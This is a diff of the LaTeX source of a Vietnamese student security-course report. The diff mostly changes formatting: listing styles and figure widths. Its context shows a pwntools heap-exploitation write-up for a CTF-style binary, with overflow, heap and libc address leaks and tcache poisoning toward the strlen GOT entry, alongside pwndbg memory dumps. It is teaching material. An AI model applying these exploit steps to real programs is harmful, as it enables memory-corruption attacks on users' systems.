@@ -51,24 +51,6 @@
   columns=fullflexible
 }
 
-% Define Python style for listings
-\lstdefinestyle{pythonstyle}{
-  language=Python,
-  basicstyle=\small\ttfamily,
-  keywordstyle=\color{blue}\bfseries,
-  commentstyle=\color{gray},
-  stringstyle=\color{red},
-  breaklines=true,
-  showstringspaces=false,
-  backgroundcolor=\color{codebg},
-  frame=single,
-  framesep=5pt,
-  xleftmargin=0.5cm,
-  xrightmargin=0.5cm,
-  columns=fullflexible,
-  literate={'}{\textquotesingle}1
-}
-
 \title{
     \huge Báo cáo đồ án môn An toàn và an ninh mạng\\
     \large Lớp học phần: INT3307E 1\\
@@ -540,7 +522,7 @@ ASLR (Address Space Layout Randomization) là cơ chế bảo vệ ngẫu nhiên
 
 Quá trình khai thác được thực hiện thông qua một exploit script viết bằng Python sử dụng framework \texttt{pwntools}. Script này (đặt tên là \texttt{solve.py}) cung cấp các hàm tiện ích để tương tác với chương trình mục tiêu một cách có cấu trúc và dễ dàng. Các hàm wrapper được định nghĩa bao gồm \texttt{create()} để tạo rune mới, \texttt{delete()} để xóa rune, \texttt{edit()} để chỉnh sửa rune, và \texttt{show()} để hiển thị nội dung rune.
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 #!/usr/bin/env python3
 
 from pwn import *
@@ -649,7 +631,7 @@ Chiến lược khai thác như sau: đầu tiên, cấp phát hai chunk liền 
   \item Chunk với \texttt{name=\textbackslash x03\textbackslash x00\textbackslash x01} được gọi là chunk 301.
 \end{itemize}
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 create(b'\x01', 0x10, b'A')
 create(b'\x02', 0x10, b'A')
 create(b'\x03', 0x60, b'A')
@@ -659,7 +641,7 @@ delete(b'\x02')
 
 Chunk 3 được tạo với kích thước lớn (\texttt{0x60}) nhằm khai thác lỗ hổng: sau khi giải phóng chunk 2 vào tcache bin, chunk 1 sẽ được chỉnh sửa với tên mới để "mượn" kích thước lớn của chunk 3, cho phép ghi tràn sang chunk 2. Trạng thái heap sau khi giải phóng chunk 2 có thể quan sát qua pwndbg:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> x/50gx 0x55555555c290
 0x55555555c290: 0x0000000000000000 0x0000000000000021  # <-- chunk 1
 0x55555555c2a0: 0x0000000000000001 0x0000000000000041
@@ -689,13 +671,13 @@ Chunk 2 đã được đưa vào tcache bin (entry size \texttt{0x20}) như sau 
 
 Tiếp theo, thực hiện edit chunk 1 với tên mới \texttt{\textbackslash x03\textbackslash x00\textbackslash x01}. Do tên này chứa NULL byte ở giữa, khi \texttt{strcpy()} sao chép vào chunk, nó chỉ lấy \texttt{\textbackslash x03}, dẫn đến \texttt{current\_index} được tính dựa trên hash của \texttt{\textbackslash x03} thay vì \texttt{\textbackslash x03\textbackslash x00\textbackslash x01}. Kết quả là chunk 1 được phép ghi với độ dài lớn hơn (kích thước của chunk 3), cho phép ghi đè 24 byte qua trường size của chunk 2.
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 edit(b'\x01', b'\x03\x00\x01', b'A' * 24)
 \end{lstlisting}
 
 Heap hiện tại trông như sau:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> x/16gx 0x55555555c290
 0x55555555c290: 0x0000000000000000 0x0000000000000021  # <-- chunk 1
 0x55555555c2a0: 0x0000000000000001 0x4141414141414141
@@ -713,7 +695,7 @@ Cần lưu ý rằng từ glibc phiên bản 2.32 trở đi, con trỏ \texttt{f
 
 Vì tất cả địa chỉ trong cùng một memory page (4KB) đều có 12 bit thấp khác nhau nhưng các bit cao giống nhau, việc dịch phải 12 bit sẽ có được địa chỉ cơ sở của page đó. Do đó, từ giá trị leak được, chỉ cần dịch trái 12 bit để thu được địa chỉ heap base. Sau khi hoàn tất việc leak, chunk 2 được cấp phát lại để dọn dẹp tcache bin và giữ heap trong trạng thái sạch sẽ cho các bước tiếp theo.
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 heap_base = u64(show(b'\x03\x00\x01')[24:].ljust(8, b'\0')) << 12
 print(f"heap base: {hex(heap_base)}")
 create(b'\x02', 0x10, b'A')
@@ -737,7 +719,7 @@ Giải pháp là tiếp tục khai thác lỗ hổng buffer overflow để kích
 
 Triển khai cụ thể như sau: cấp phát ba chunk mới (chunk 5, 6, 7). Chunk 5 sẽ được dùng để overflow vào chunk 6, ghi đè trường \texttt{size} thành \texttt{0x421}. Chunk 6 được chọn có kích thước \texttt{0x60} bytes để sau khi giải phóng vào unsorted bin, có thể cấp phát lại một phần nhỏ (\texttt{0x10} bytes) tránh heap bị corrupt quá nhiều.
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 create(b'\x05', 0x10, b'A')
 create(b'\x06', 0x60, b'A')
 create(b'\x07', 0x60, b'A')
@@ -759,7 +741,7 @@ Nguyên nhân là cơ chế kiểm tra an toàn của ptmalloc. Khi giải phón
 
 Trạng thái heap sau khi ghi đè \texttt{size} của chunk 6 thành \texttt{0x420}:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> x/50gx 0x55555555c290                                     
 0x55555555c290: 0x0000000000000000 0x0000000000000021             
 0x55555555c2a0: 0x0000000000000003 0x4141414141414141             
@@ -790,14 +772,14 @@ pwndbg> x/50gx 0x55555555c290
 
 Với chunk 6 có \texttt{size = 0x421}, ptmalloc tính địa chỉ chunk tiếp theo:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> p/x 0x55555555c360 + 0x420
 $1 = 0x55555555c780
 \end{lstlisting}
 
 Tại địa chỉ này không có dữ liệu gì (toàn NULL), nên \texttt{prev\_inuse} bit bằng \texttt{0}, khiến ptmalloc nghĩ chunk 6 đã được giải phóng trước đó:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> x/10gx 0x55555555c780
 0x55555555c780: 0x0000000000000000 0x0000000000000000
 0x55555555c790: 0x0000000000000000 0x0000000000000000
@@ -808,7 +790,7 @@ pwndbg> x/10gx 0x55555555c780
 
 Giải pháp: cấp phát nhiều chunk để "lấp đầy" vùng nhớ từ chunk 7 đến địa chỉ \texttt{0x55555555c780}, sau đó ghi một chunk header giả tại đó với \texttt{prev\_inuse} bit được set (LSB của \texttt{size} = 1):
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 create(b'\x05', 0x10, b'A')
 create(b'\x06', 0x60, b'A')
 create(b'\x07', 0x60, b'A')
@@ -827,7 +809,7 @@ edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))
 
 Sau khi cấp phát các chunk này, heap layout sẽ có chunk header giả tại \texttt{0x55555555c780}:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> x/50gx 0x55555555c290
 0x55555555c290:	0x0000000000000000	0x0000000000000021
 0x55555555c2a0:	0x0000000000000003	0x4141414141414141
@@ -867,14 +849,14 @@ pwndbg>
 
 Bây giờ ptmalloc tìm thấy một chunk header hợp lệ tại \texttt{0x55555555c780} với \texttt{prev\_inuse} bit được set (\texttt{0x41}), cho phép giải phóng chunk 6 vào unsorted bin thành công. Sau đó, cấp phát lại một phần nhỏ:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 delete(b'\x06')
 create(b'\x06', 0x10, b'A')
 \end{lstlisting}
 
 Chunk 6 gốc (kích thước \texttt{0x420}) được split: \texttt{0x20} bytes đầu được cấp phát lại, phần còn lại (\texttt{0x400} bytes) quay trở lại unsorted bin. Heap layout hiện tại trông như sau:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> x/50gx 0x55555555c290
 0x55555555c290:	0x0000000000000000	0x0000000000000021
 0x55555555c2a0:	0x0000000000000003	0x4141414141414141
@@ -905,7 +887,7 @@ pwndbg> x/50gx 0x55555555c290
 
 Quan trọng nhất, tại offset \texttt{0x10} trong remainder chunk (\texttt{0x55555555c390}), là con trỏ \texttt{fd} trỏ về main arena: \texttt{0x00001555553f2cc0}. Gọi \texttt{show()} để leak địa chỉ này. Từ địa chỉ này, tính offset để tìm libc base:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 pwndbg> vmmap libc.so.6
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
@@ -921,7 +903,7 @@ $1 = 0x1f3041
 
 Leak và tính libc base:
 
-\begin{lstlisting}[style=pythonstyle]
+\begin{lstlisting}[language=Python]
 libc.address = u64(show(b'\x06').ljust(8, b'\0')) - 0x1f3041
 print(f"libc base: {hex(libc.address)}")
 \end{lstlisting}
@@ -1080,7 +1062,7 @@ Tcache hiện trông như sau:
 
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{images/image-25.png}
+    \includegraphics[width=\textwidth]{images/image-25.png}
     \caption{Trạng thái tcache bin trước khi ghi đè}
 \end{figure}
 
@@ -1092,7 +1074,7 @@ edit(b'\x17', b'\x19\x00\x01', b'A' * 16 + p64(0x71) + p64(strlen_got))
 
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{images/image-26.png}
+    \includegraphics[width=\textwidth]{images/image-26.png}
     \caption{Chương trình bị crash với lỗi SIGSEGV}
 \end{figure}
 
@@ -1123,7 +1105,7 @@ Theo Perplexity, trên phiên bản glibc 2.34, chunk được lấy từ tcache
 
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.8\textwidth]{images/image-29.png}
+    \includegraphics[width=\textwidth]{images/image-29.png}
     \caption{Hành vi của ptmalloc khi cấp phát từ tcache bin}
 \end{figure}
 
